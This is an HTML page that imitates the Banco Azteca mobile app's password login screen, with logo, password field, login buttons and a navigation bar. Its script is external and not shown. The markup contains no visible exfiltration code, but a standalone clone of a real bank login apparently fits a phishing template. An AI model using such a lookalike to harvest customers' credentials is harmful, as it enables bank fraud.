<!DOCTYPE html>
<html lang="es-MX">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
  <meta name="theme-color" content="#ffffff" />
  <meta name="referrer" content="no-referrer" />
  <title>Banco Azteca</title>
  <link rel="stylesheet" href="./css/main.css" />
</head>
<body>
  <div class="page" id="page">
    <header class="hero">
      <img class="logo" src="./assets/logo.png" width="88" height="88" alt="Banco Azteca" />
      <p class="greeting-time" id="greetingTime">Buenas noches</p>
    </header>

    <main class="form">
      <div class="form-fields">
      <label class="field" id="field">
        <span class="field-label">Contraseña</span>
        <div class="field-row">
          <input
            id="pwdInput"
            class="pwd-input"
            type="password"
            inputmode="text"
            autocomplete="off"
            autocorrect="off"
            autocapitalize="off"
            spellcheck="false"
            maxlength="64"
            aria-label="Contraseña"
          />
          <button type="button" class="pwd-toggle" id="toggleBtn" aria-label="Mostrar contraseña" aria-pressed="false">
            <svg class="icon-eye-off" viewBox="0 0 24 24" width="22" height="22" aria-hidden="true">
              <path fill="none" stroke="currentColor" stroke-width="1.8" d="M3 12s3.5-6 9-6 9 6 9 6-3.5 6-9 6-9-6-9-6z" />
              <circle cx="12" cy="12" r="2.5" fill="none" stroke="currentColor" stroke-width="1.8" />
              <path fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" d="M4 4l16 16" />
            </svg>
            <svg class="icon-eye-on" viewBox="0 0 24 24" width="22" height="22" aria-hidden="true">
              <path fill="none" stroke="currentColor" stroke-width="1.8" d="M3 12s3.5-6 9-6 9 6 9 6-3.5 6-9 6-9-6-9-6z" />
              <circle cx="12" cy="12" r="2.5" fill="none" stroke="currentColor" stroke-width="1.8" />
            </svg>
          </button>
        </div>
      </label>

      <div class="forgot-wrap">
        <button type="button" class="forgot-link" id="forgotBtn">OLVIDÉ MI CONTRASEÑA</button>
      </div>
      </div>

      <div class="actions">
        <button type="button" class="btn btn-primary" id="enterBtn">ENTRAR</button>
        <button type="button" class="btn btn-outline" id="faceBtn">ENTRAR CON ROSTRO</button>
      </div>
    </main>

    <nav class="bottom-nav" aria-label="Acciones">
      <button type="button" class="nav-item" data-action="pagar">
        <svg viewBox="0 0 24 24" width="26" height="26" aria-hidden="true">
          <rect x="5" y="4" width="14" height="16" rx="2" fill="none" stroke="currentColor" stroke-width="1.8" />
          <path fill="none" stroke="currentColor" stroke-width="1.8" d="M9 8h6M9 12h4" />
        </svg>
        <span>Pagar</span>
      </button>
      <button type="button" class="nav-item" data-action="cobrar">
        <svg viewBox="0 0 24 24" width="26" height="26" aria-hidden="true">
          <rect x="4" y="6" width="16" height="12" rx="2" fill="none" stroke="currentColor" stroke-width="1.8" />
          <path fill="none" stroke="currentColor" stroke-width="1.8" d="M8 10h8" />
        </svg>
        <span>Cobrar</span>
      </button>
      <button type="button" class="nav-item" data-action="ayuda">
        <svg viewBox="0 0 24 24" width="26" height="26" aria-hidden="true">
          <circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="1.8" />
          <path fill="none" stroke="currentColor" stroke-width="1.8" d="M9.5 9a2.5 2.5 0 1 1 4.2 1.8c-.8.7-1.7 1.2-1.7 2.7V15" />
          <circle cx="12" cy="17.5" r="1" fill="currentColor" />
        </svg>
        <span>Ayuda</span>
      </button>
    </nav>
  </div>
  <div class="toast" id="toast" role="status" aria-live="polite"></div>
  <script src="./js/main.js"></script>
</body>
</html>
